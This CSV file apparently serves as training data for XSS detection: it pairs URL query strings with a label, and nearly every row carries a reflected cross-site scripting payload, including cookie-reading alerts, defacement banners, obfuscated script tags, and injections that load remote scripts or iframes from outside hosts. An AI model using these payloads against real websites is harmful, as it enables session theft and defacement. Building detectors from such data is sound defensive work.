Payload,Label
Query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&sortby=di<br/>splay_time+descending&subheader-search-button=Go&target=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
redir=bin%2Flogin.html%3Fredir%3D%22%3E%3Cscript%3Ealert<br/>%28%27TreX%27%29%3C%2Fscript%3E%3Ch1%3EHacked%2520By%2520TreX%3C%2Fh1%3E,1
t=%3C/title%3E%3CscRipT%3Ealert(123)%3C/scRIpT%3E&v=0&c=1&p=1&r=1183836020339,1
PAGE=1506&PRINTAREA=%3Cscript%3Ealert(document.cookie);%3C/scr<br/>ipt%3E,1
page=0&typeFilter=RT&value=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%<br/>3E,1
ie=UTF-8&ps=10&np=1&fm=off&q=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL&<br/>cl=4&button=%E7%AB%8B%E5%8D%B3%E6%90%9C%E7%B4%A2,1
bannerid=4&zoneid=1&s&zoneid=41&source=&dest=http://seym<br/>en.org,1
id=9&bt=o&st=web&fm=pro&ec=gb2312&kw=%22%3E%3Cmarquee%3EDe<br/>faced+BY+Sponsfull&imagefield.x=0&imagefield.y=0,1
"Base=ISBD&SearchTerm=""><script>alert(documen<br/>t.cookie)</script>><marquee><h1>BackDoor</h1></marquee>",1
"new=""><script>alert(1)</script>",1
"name=&email=""><script>alert(/XSS/)</script>",1
id=10985%22%3E%3Ciframe%20src=http://turkhackeriz.com/%3E,1
cx=003678230413947612686%3Ao1vg-hvnsdg<br/>&cof=FORID%3A9&ie=iso-8859-1&q=%5C%22%3E%3Cmarquee%3E%3Ch1%3EDEFACED+BY+SPONSFULL%3C%2Fh1%3E%3C%2Fma<br/>rquee%3E&sa=Rechercher,1
name=%3Cmarquee%3E%3Ch1%3Ecueballr%3C/h1%3E%3C/marquee%3<br/>E%3Cscript%3Ealert('cueballr')%3C/script%3E&id=18,1
"email=""><script>alert(/XSS/)</script>",1
"query=%3Cscript%3Ealert(String.fromCharCode(79,87,78,<br/>69,68,66,121,101,75,66,69,82))%3C/script%3E",1
"first_name=""><script>alert(/XSS/<br/>)</script>",1
"id=1'""><script>alert(document.cookie)</script>",1
u=banoffi_pie&p=1&f=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
"MIN_SPACECRAFT_CLOCK_START_COUNT=""<script><br/>alert(/XSS/)</script>",1
"ft=""><script>alert(/XSS/)</script>",1
"continent=""><script>alert('HACKED_By_TurKPoweR')</script><h1>H<br/>ACKED-By-TurKPoweR",1
"a=events&b=""><script>alert(1)</script>",1
txtrecherche=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20<br/>by%20ironzorg%3C/h1%3E%3C/marquee%3E,1
m=l&s=1&z=%3Cscript%3Ealert(123456789)%3C/script%3E,1
mot=%22%3E%3Cscript%3Ealert(%22DeFaCed%20By%2<br/>0SpOnSFuLL%22);%3C/script%3E&x=0&y=0&mid=7b2eafcecddc0baf3574127d145368c0&l=fr&xml=ON&typeQuery=1,1
bug_age=0&bug_type=&cmd=display&direction=ASC&limit=10%3Cscript%3Ea<br/>lert(document.cookie)%3C/script%3E&os=0&search_for=usr&severity=1&status=Duplicate,1
catID=4&cat=%22%3E%3Cscript%3Ealert('seymen')%3C/script%3E,1
SearchField=keywords&search=%3Cscript%3Ealert(%22Zeryus%22)%3C/<br/>script%3E,1
recherche_site=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E<br/>alert%28'Damned!'%29%3C%2Fscript%3E,1
recherche=%3Cscript%3Ealert%28%22Zeryus%22%29%3C%2Fscript%3E&su<br/>bmit.x=0&submit.y=0,1
back=1&mode=societe&societe=%3Cscript%3Ealert(%22Zeryus%22)%3C<br/>/script%3E,1
recherche=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%<br/>3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&imageField2.x=0&imageField2.y=0,1
ra=%3Cscript%3Ealert%280%29%3C%2Fscript%3E,1
pageid=2&coe_i_id=59&keyword=%3Cscript%3Ealert(%22Zeryus%22)%3<br/>C/script%3E&rech_chek=2&type=recherche&start=20&end=39&recherche,1
query=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3<br/>E&x=9&y=9,1
q=%3Cscript%3Ealert%28%22Zeryus%22%29%3C%2Fscript%3E&x=0<br/>&y=0,1
"sektor=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69<br/>,68,66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
movie_id=5616&smallscreen_id=%22%3E%3Cscript%3Ealert(1)%<br/>3C/script%3E,1
"zip=""><script>alert('seymen')</script>",1
"q=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,66,1<br/>21,101,75,66,69,82))%3C/script%3E",1
action=2&recherche=%3Cscript%3Ealert%281337%29%3C%2<br/>Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&type=0&Envoi=Rechercher+dans<br/>+INDEXA,1
q=%3Cscript%3Ealert(%22Zeryus%22)%3C/scri<br/>pt%3E,1
prov=emploi&univ=3&fiche=%3Cscript%3Ealert('XSS%20by%20\nXy<br/>litol')%3C/script%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
univ=%3Cscript%3Ealert('XSS%20by%20\nXylitol')%3C/script%3E%3Cmarq<br/>uee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
"x=0&y=0&what=""><script>alert(1)</script>&where=laws",1
criteres=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarque<br/>e%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&x=28&y=11&type=or,1
"ACCT=1&TICK=TRUE&STORY=/www/story/05-13-2008/0004<br/>812032&EDATE=""><body%09onload%3D""alert('XSS')"">",1
texterecherche=%3Cscript%3Ealert%28%27XSS+by+<br/>%5CnXylitol%27%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&searc<br/>h=Rechercher,1
"q=""><script>alert(1)</script>&btnG=Search+AZoM&sort=date:D:L:d1&outpu<br/>t=xml&lr=&client=azom&filter=0&image1.x=20&oe=utf8&ie=utf8&image1.y=22&site=AZOM-ARTICLES|AZOM-NEWS|<br/>AZOM-SUPPLIERS|AZOM-BOOKS|AZOM-COURSES|AZOM-EVENTS",1
search=%3Cscript%3Ealert%28%27XSS+by+%5CnXylitol%27%29%3C%2Fscript<br/>%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E,1
address=<script>alert('Hacked%20by%20mBz%20The-Operations.Org')%3<br/>B</script>&range=2&search=Trouver,1
successurl=amF2YXNjcmlwdDphbGVydCgvWFNTLkJ5Lk1pdHlvLyk=,1
"resid=8713&subval=special_offers_XTR013&durl=""><script>alert(""Fugi<br/>tif"")</script>",1
fullText=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmar<br/>quee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&x=0&y=0&type=rmc,1
alang=fr&search=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20i<br/>ronzorg%3C/h1%3E%3C/marquee%3E,1
"id=""><script>alert(document.cookie)</script>><marquee><h1>BackDoor<<br/>/h1></marquee>",1
"st=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromC<br/>harCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))/<br/>/--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
showcat=%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(1)%3<br/>B%3C/ScRiPt%3E,1
query=-%3Cscript%3Ealert%28String.fromCharCode%2879%2C87%2C78%2C6<br/>9%2C68%2C66%2C121%2C101%2C75%2C66%2C69%2C82%2C85%2C113%2C65%2C78%29%29%3C%2Fscript%3E,1
"LinkField=""><iframe<br/>src=http://system.premium.com.mk></iframe><script>alert(document.cookie);</script>",1
"q=""><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurK<br/>PoweR",1
"query=B%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,<br/>66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
"col=""><script><br/>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR",1
recherche=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg%3C%2Fh<br/>1%3E%3C%2Fmarquee%3E&do_recherche=OK,1
"query=%3Cscript%3Ealert(String.fromCharCode(79,87,78,69,68,<br/>66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
"domain=""><script>alert(/XSS/)</script>",1
T1=%3Cscript%3Ealert(666)%3C/script%3E,1
cid=220&sitio=%3Cscript%3Ealert(5);%3C/script%3E,1
id=10&quicksearchquery=%22%3e%3cscript%3ealert(123)%3c%2f<br/>script%3e,1
"searchtext=%3Cscript%3Ealert(String.fromCharCode(79,87,<br/>78,69,68,66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
region=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
"name=""><body onload=alert(/XSS/.source)></body>",1
presearch=1&term=%3Cscript%3Ealert%28%22XSSED+by+AZAT%2<br/>2%29%3C%2Fscript%3E,1
search=%3Cscript%3Ealert(document.domain)%3C/script%3E,1
search_string=%3CSCRIPT%3Ealert%28%<br/>27XSSED BY AZAT%27%29%3C%2FSCRIPT%3E,1
sGoto=%22%3E%3Cscript%3Ealert(123)%3C/script%3E,1
sPage=http://uber0n.darkillusion.org/xsspage.htm,1
go_url='%3E%3Cscript%3Ealert(123)%3C/script%3E,1
"artikel=ergebnis&db=phpprogramme&ordner=1&bildvorschau=1&krit1<br/>=""><script>alert('By_TurKPoweR')</script><h1>HACKED-By-TurKPoweR",1
qu=%22%3E%3Cimg+src+onerror=%22alert(%27C1c<br/>4Tr1Z%27)%22%3E,1
doc=javascript:alert(document.cookie);alert(/xss/),1
keyword=%3Cscript%3Ealert%28document.domain%29%3C%2Fs<br/>cript%3E&GO=%BB&submit=1,1
"anahtar=%3Cscript%3Ealert(String.fromCharCod<br/>e(79,87,78,69,68,66,121,101,75,66,69,82,85,113,65,78))%3C/script%3E",1
"query=%3C/title%3E%3Cscript%3Ealert(String.fromCharCode(72,69,76,<br/>76,79))%3C/script%3E",1
"course=""><iframe<br/>src=http://system.premium.com.mk></iframe><script>alert(document.cookie);</script>",1
q=<script>alert(123)</script>&as_oq=site%3Amed.stanford.edu%2Firt%2Fw<br/>eb&numgm=5&site=stanfordmedicine&client=stanfordmed&output=xml_no_dtd&proxystylesheet=stanfordmed&as<br/>_dt=i&btnG.x=0&btnG.y=0&btnG=Search,1
action_type=search&search_type=keyword&keyword=%3Cscr<br/>ipt%3Ealert%280%29%3C%2Fscript%3E,1
"id_rubrique=2&recherche=<ScRiPt%20%0a%0d>alert(""sovietw0rm was<br/>here"")%3B</ScRiPt>",1
"id_rubrique=2&err=%3Cscript%3Ealert(""sovietw0rm was<br/>here"")%3C/script%3E",1
"magID=10&magNum=""><script>alert(""cwdaimon@gmail.com"")</scrip<br/>t>",1
"p=117404&url=""><script>alert(""cwdaimon@gmail.com"")</scrip<br/>t>",1
"words=""><script>alert(""cwdaimon@gmail.com"")</script>",1
"i=""><script>alert('TreX')</script><h1>TurkHackeriZ.CoM</h<br/>1>",1
"page=""<script>alert(1)</script>",1
source=sde&radiosearch=archiv&q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2F<br/>script%3E&x=17&y=10,1
referrer=client%22%3E%3Ciframe%20src=http://xsse<br/>d.com%3E,1
display=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3<br/>C/h1%3E%3C/marquee%3E,1
"lettera=""><script>alert(1)</script>",1
vorschau=&ln=1&navid=29&open=%3C%22%3C%3CsCrIpT%<br/>3Ealert(document.cookie)%3C/ScRiPt%3E,1
query=%22%3E%3Cscript%3Ealert%28%22russianblackbmx%40yahoo.com%22%29%<br/>3C%2Fscript%3E,1
email=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C<br/>/h1%3E%3C/marquee%3E,1
criterio=cadena&string=%22%3E%3Cscript+src%3Dhttp%3A%<br/>2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fckers.org.js%3E%3C%2Fscript%3E&x=0&y=0,1
keywords=%3Cscript%3Ealert(31337)%3C/script%3E&x=19&y<br/>=20,1
diretorio=misc&arquivo=pesquisa_site_consulta_areas,1
"page=tour&id=""><script>alert(document.cookie)</script>><html><<br/>input%20type=""file""></html><marquee><h1>BackDoor</h1></marquee>",1
mot=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3<br/>EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&m=se,1
q=%22%27%3E%3Cmarquee%3Estfu%3C%2Fmarquee%3E,1
action=seek&mots=%3Cscript%3Ealert%281337%29%3C%2Fscrip<br/>t%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&nb_results2show=10&booleen=AND,1
"keywords=""><script>alert(""g3"");</script>",1
search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&limit=25,1
words=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20<br/>ironzorg%3C/h1%3E%3C/marquee%3E,1
qs=%22%3E%3E%3E%3E%3Ciframe+src%3D%22http://ha.cker<br/>s.org/xss.jpg%22,1
display=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1%3<br/>E%3C/marquee%3E,1
cat=6&keyword=%3Cscript%3Ealert%281337%29%3C%2Fscrip<br/>t%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&opt=0&Submit3=Recherche,1
"category_id=""><script>alert(document.cookie)</script>><marquee><h<br/>1>BackDoor</h1></marquee>",1
step=userinfo&bIncludeAuth=1&firstName=%22%3E%3Cscri<br/>pt%3Ealert%281%29%3C%2Fscript%3E&lastName=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&credentials=<br/>MD&state=AZ&zip=%22%3E%3Csc&dateOfBirth_month=0&dateOfBirth_day=0&dateOfBirth_year=1900&dateOfBirth=<br/>-2208880694731&email=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&userName=%22%3E%3Cscript%3Ealert&<br/>password=%22%3E%3Cscript%3Ealert&confirmPassword=%22%3E%3Cscript%3Ealert&primarySpecialty=&secondary<br/>Specialty=&tertiarySpecialty=&promocode=%22%3E%3Cscript%3Ealert%281%29%3C%2F,1
name=trip&place0=%24place0&place1=%24place1&p0=%5C%22%3E%<br/>3Cscript%3Ealert%281%29%3C%2Fscript%3E%3D%2F%2F%2F%2F&p1=%5C%22%3E%3Cscript%3Ealert%281%29%3C%2Fscri<br/>pt%3E&landmark0=&landmark1=%2B%2B%2B%2B&ampm=AM&pname0=%5C%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript<br/>%3E%3D%2F%2F%2F%2F&pname1=%5C%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&day=Thu&timecrit=LV&min=2<br/>3&our=08&hour=&mode=ANY&fare=RG&walk=1760&hcaccess=%24hcaccess&walking_distiance=&sort=&outputtype=&<br/>searchoptions=&distance=&sel=&auto=ON&function=get_itins&backambig=%2Fpub_trip.php%3Fimage_height%3D<br/>288%26image_width%3D288%26href%3D%2527base_map_url%2527%26onclick%3Dwindow.parent.frames%255B1%255D.<br/>setmap%2528%2527base_map_url%2527%252C%2527qvimg1%2527%2529%253B%26number_of_columns%3D2%26output_ty<br/>pe%3Dmap%26pixels_per_foot%3D9.16666666666%26scale%3D4400%26data_layers%3Dall%26target%3Dright_ifram<br/>e%26debug_page%3Dtrue%26distiance_threashold%3D50%26mypaths%3D%2524mypaths%26place0%3D%2524place0%26<br/>p0%3D%2524p0%26place1%3D%2524place1%26p1%3D%2524p1%26day%3D%2524day%26ampm%3D%2524ampm%26min%3D%2524<br/>min%26our%3D%2524our%26timecrit%3D%2524timecrit%26fare%3D%2524fare%26walk%3D%2524walk%26hcaccess%3D%<br/>2524hcaccess%26mode%3D%2524mode%26ovrte1%3D%2524ovrte1%26ovrte2%3D%2524ovrte2%26ovrte3%3D%2524ovrte3<br/>%26ovrte4%3D%2524ovrte4%26p0%3D%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253E%3D%252b%252<br/>b%252b%252b%26p1%3D%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253E%26landmark1%3D%252b%252<br/>b%252b%252b%26timecrit%3DLV%26day%3DThu%26our%3D08%26min%3D23%26ampm%3DAM%26mode%3DANY%26fare%3DRG%2<br/>6walk%3D1760&backtrips=&mypaths=%24mypaths&ovrte1=&ovrte2=&ovrte3=&ovrte1test=&ovrte2test=&ovrte3tes<br/>t=&image_width=288&image_height=288,1
lid=20071123194608&langue2=fr&email=%3Cscript%3Ealert%281337%29%<br/>3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&action=subscribe&submit=<br/>OK,1
"forgotPasswordUsername=<iframe<br/>style=""position:absolute;left:0;top:0;z-index:9999"" src=""http://www.xssed.com/"" width=100%25<br/>height=4000 frameborder=0 scroll=no></iframe>",1
"item=""><script>alert(document.cookie)</script<br/>>><marquee><h1>BackDoor</h1></marquee>",1
q=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%281337%29%3C%2Fscr<br/>ipt%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&btnG=yPass.net+Search&ypasso<br/>nly=0,1
nid=-%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)%3C/ScRipT%3E,1
q=%3Cscript%3Ealert(31337)%3C/script%3E&ie=&site=&output=xml_no_dtd<br/>&client=REALTOR_org&lr=&proxystylesheet=REALTOR_org&oe=ISO-8859-1,1
iPage=1,1
searchstring=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20iron<br/>zorg%3C/h1%3E%3C/marquee%3E,1
swhat=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg%3C%2<br/>Fh1%3E%3C%2Fmarquee%3E&submit=ok,1
q=%22%3E'%3E%3CscRipT%3Ealert(123)%3C/scRIpT%3E,1
searchMode=%22%3E%3Cscript%3Ealert(1)%3C/scrip<br/>t%3E&presenter=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
uname=<body onload=alert(/XSS/.source)>,1
mot=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarque<br/>e%3E%3Ch1%3Exss+by+zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E,1
what=wp&lang=&ax=&search_word=%3C%2Ftitle%3E%3CscRipT%3Ealert%28123%2<br/>9%3C%2FscRIpT%3E&geo_area=,1
controller=account_create,1
"item=600685&title=""><h1>Xssed<script>alert(do<br/>cument.cookie)</script>><marquee><h1>BackDoor</h1></marquee>",1
s=%3cscript%3ealert('xss%2bby%2bdouble_check')%<br/>3c%2fscript%3e,1
so=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E,1
controller=contact,1
"l=""><script>alert(123)</script>",1
"d=""><script>alert(123)</script>&lid=Cirkuskiosken&from=menu",1
"query=""><script>alert(document.cookie);</script>",1
recherche=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E%3Cmarque<br/>e%3E%3Ch1%3EXSS+by+Zeryus%3C%2Fh1%3E%3C%2Fmarquee%3E&imageField2.x=0&imageField2.y=0,1
ml=%3C/a%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E,1
domain=%22%3E%3Cscript%3Ealert(1)%3C/script%3<br/>E&ext=com,1
suche=%3C%22%3C%3CsCrIpT%3Ealert(document.cookie)%3C%2F<br/>ScRiPt%3E&mSuchen=Suche,1
q=HOVER+ME%21%21%21%22+onmouseover%3D%22alert%28123%29,1
iMappeID=180&sSideNavn=Receptlistning&int<br/>SideNr=1&selVarldensMat=0&selHelg=0&selRecept=0&selHuvudIngrediens=0&selMaltid=0&SearchValue=%22%3E%<br/>3Cscript%3Ealert%28123%29%3C/script%3E,1
error=1&kon=&skola=&email=&program=&poang=&a_namn=%22%3E%<br/>3Cscript%3Ealert(123)%3C/script%3E&f_namn=&e_namn=&p_nr=&p_ort=&alder=&felav=*%20Du%20m%E5ste%20godk<br/>%E4nna%20och%20l%E4sa%20de%20Allm%E4nna%20villkoren&felprogram=*%20Du%20gl%F6mde%20att%20skriva%20vi<br/>lken%20kurs%20eller%20vilket%20program%20du%20l%E4ser!&alderfel=*%20Fyll%20i%20ditt%20f%F6delsedatum<br/>!&p_nrfel=*%20Fyll%20i%20ett%20postnummer!&postortfel=*%20Fyll%20i%20en%20postort!&losenfel=*%20L%F6<br/>senorden%20m%E5ste%20vara%20lika%20och%20%F6ver%204%20tecken%20l%E5ngt!&a_namnfel=*%20Anv%E4ndarnamn<br/>et%20%E4r%20inte%20giltigt!&felmail=*%20Skriv%20en%20korrekt%20email-adress!&konfel=*%20V%E4lj%20ett<br/>%20k%F6n!&bonuskod=&gatuadressfel=Du%20m%E5ste%20ange%20gatuadress!,1
"search=%22%3E%3Cscript%3Ealert(String.fromCharCode(98,121,32<br/>,67,104,101,101,115,101));%3C/script%3E%3C!--",1
id=14328&islem=yorum&tur=%22%3E%3Cscript%3Ealert('seyme<br/>n')%3C/script%3E,1
r=http://seymen.org,1
keyword=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&id=5267&t<br/>ype=storage,1
name=MyASearch&mot_ou=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+<br/>ironzorg%3C%2Fh1%3E%3C%2Fmarquee%3E&numres=30&pic=Wallpapers,1
s=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg%3C%2Fh1%3E%3C%2Fma<br/>rquee%3E&searchbutton=Go%21,1
"id=13783&mail=""><script>alert(1)</script>",1
s=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&submit=Go,1
q=%22%3E%3Ch1%3E%3Cmarquee%3E---+XSSED+---%3C%2Fmarquee%3E%3C%<br/>2Fh1%3E&search=Search+Our+Site,1
searWords=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,1
page=contactus&processed=true,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript<br/>%3E&ext=com&imageField.x=58&imageField.y=14,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&<br/>ext=com&imageField.x=58&imageField.y=14,1
"queryaction=results&SearchString=0;url=javascript:alert('X<br/>SS')""%09http-equiv=""refresh",1
ReadForm&Query=%3Cscript%3Ealert(1337)%3C/script%3E%3<br/>Cmarquee%3E%3Ch1%3EXSS%20by%20Zeryus%3C/h1%3E%3C/marquee%3E%3Ciframe%20src=%22www.xssed.com%22%3E,1
mact=Questions%2Cm4%2Cdefault%2C1&m4returnid=62&page=62&m4return<br/>id=62&m4input_keywords=&m4input_author=&m4input_answered_by=&m4filtersubmit=Apply&m4input_keywords=%<br/>22%3E%3Cscript%3Ealert('xssed')%3C/script%3E&m4input_author=&m4input_answered_by=&m4filtersubmit=App<br/>ly,1
v=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h<br/>1%3E%3C/marquee%3E,1
types=title&keywords=%22%3E%3Cscript%3Ealert%28String.fromChar<br/>Code%2872%2C65%2C89%2C65%2C76%2C69%2C84%2C75%2C82%2C65%2C76%29%29%3B%3C%2Fscript%3E&x=14&y=17,1
query=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&se<br/>arch=1,1
"kword=""><script>alert(document.cookie)</script>><marquee><h1>Ba<br/>ckDoor</h1></marquee>",1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%<br/>3E&ext=com&imageField.x=58&imageField.y=14,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ex<br/>t=com,1
Eingabe[Email]=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
search=<script>alert('XSS')</script>,1
bannerid=27&zoneid=1&s&zoneid=41&source=&dest=http://seyme<br/>n.org,1
suchbegriff=%22%3E%3Cscript%3Ealert(1)%3C%2F<br/>script%3E&language=de&organisation=001&nav_seq=206&template=xxxxxAr02Suche,1
formsubmit=1&searchstring=<script>alert('XSS')<<br/>/script>,1
btitle=%27+%3Cimg%20src%20onerror=%22alert(%27XSS%27)%22%3E&bcate<br/>gory=&bquery=,1
search=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
domain=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscrip<br/>t%3E&ext=com,1
search=%22%3E%3Cscript%3Ealert%28%27XSS+by+%5CnXylitol%27%29%3C<br/>%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&lang=fr,1
appname=100358&moduleid=451&campaignid=10148&iuse<br/>rcampaignid=28094660&siteadvsearch=1&collections=10%2C1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9&searchtype=a<br/>ll&displaytype=relevance&searchmethod=basic&fuseaction=search.results&keywords=%3E%22%3E%3CScRiPt%20<br/>%0A%0D%3Ealert(%22pathetic!%22)%3B%3C/ScRiPt%3E,1
"prog_id=""<br/>style=""foo:exp/**/ression(alert('XSS-IE-ONLY'))"" x=""",1
lg=fr&recherche_active=1&mot_cles=%22%3E%3Cscript%3Eale<br/>rt%28%27XSS+by+%5CnXylitol%27%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%<br/>2Fmarquee%3E&categorie=produits&x=11&y=6,1
search=%22%3E%3Cscript+src%3Dhttp%3A%2F%2Fbyccc.awardspace.com%2Fjs%2Fxssccc.<br/>js%3E%3C%2Fscript%3E&action=Search,1
Suchbegriffe=%22%3E%3Cscript%3Ealert%2<br/>8%27XSS+by+%5CnXylitol%27%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fma<br/>rquee%3E&showresults=TRUE&nav_23=J&nav_443=J&nav_24=J&nav_25=J,1
"id=20080525-0%22%3E%3Cscript%3Ealert(String.fromCharC<br/>ode(72,65,89,65,76,69,84,75,82,65,76))%3C/script%3E",1
id=105'%22%3E%3C/title%3E%3Cscript%3Ealert(1337)%3C/scri<br/>pt%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Xylitol%3C/h1%3E%3C/marquee%3E,1
keyword=%22%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E,1
champ=%27%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%28<br/>1337%29%3C%2Fscript%3E%3E%3Cmarquee%3E%3Ch1%3EXSS+by+Xylitol%3C%2Fh1%3E%3C%2Fmarquee%3E&imageField.x<br/>=0&imageField.y=0,1
search_box=%3Cscript%3Ealert(/XSSed%20by%20Dr.Optix!%20Why?%<br/>20Because%20I%20can!/)%3C/script%3E,1
